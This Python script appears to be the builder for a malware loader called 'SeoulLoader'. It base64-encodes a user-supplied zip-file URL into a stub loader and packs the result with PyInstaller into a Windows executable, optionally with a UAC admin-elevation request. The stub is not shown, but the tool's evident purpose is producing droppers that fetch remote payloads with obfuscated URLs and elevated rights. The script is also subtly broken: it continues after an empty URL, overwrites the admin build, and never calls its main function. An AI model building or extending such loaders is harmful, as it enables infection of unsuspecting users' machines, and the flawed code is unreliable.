import os
import sys
import colorama
from colorama import Fore, Style
import re
import base64

def main():
    url = input('URL for zip file: ')
    if not url:
        print(Fore.RED + '[-] You must provide a URL.' + Style.RESET_ALL)

    try:
        encoded_url = base64.b64encode(url.encode()).decode()
        with open('stub/loader.py', 'r') as file:
            content = file.read()

        content = content.replace('_SEOUL_URL_', f'"{encoded_url}"')

        if not os.path.exists('dist'):
            os.mkdir('dist')

        with open('dist/built_loader.py', 'w') as out:
            out.write(content)

        print(Fore.GREEN + '[+] Loader built successfully: dist/built_loader.py' + Style.RESET_ALL)
        print(Fore.BLUE + '[*] Should the executable be with administrator privileges? (y/n): ' + Style.RESET_ALL)
        admin_choice = input().strip().lower()

        if admin_choice == 'y':
            print(Fore.BLUE + '[*] Building Executable with admin...' + Style.RESET_ALL)
            print(Fore.YELLOW + '[*] Requesting admin privileges...' + Style.RESET_ALL)
            os.system('pyinstaller --onefile --uac-admin dist/built_loader.py --distpath dist --name SeoulLoader')
            print(Fore.GREEN + '[+] Executable built successfully with admin privileges: dist/SeoulLoader.exe' + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + '[*] No admin privileges will be requested.' + Style.RESET_ALL)
        
        os.system('pyinstaller --onefile dist/built_loader.py --distpath dist --name SeoulLoader')
        print(Fore.GREEN + '[+] Executable built successfully: dist/SeoulLoader.exe' + Style.RESET_ALL)
        os.remove('dist/built_loader.py')

    except FileNotFoundError:
        print(Fore.RED + '[-] Error: stub/loader.py not found.' + Style.RESET_ALL)
        sys.exit(1)

    except Exception as e:
        print(Fore.RED + f'[-] Error: {e}' + Style.RESET_ALL)
        sys.exit(1)

if __name__ == '__main__':
    print("Please run main.py instead of this file directly.")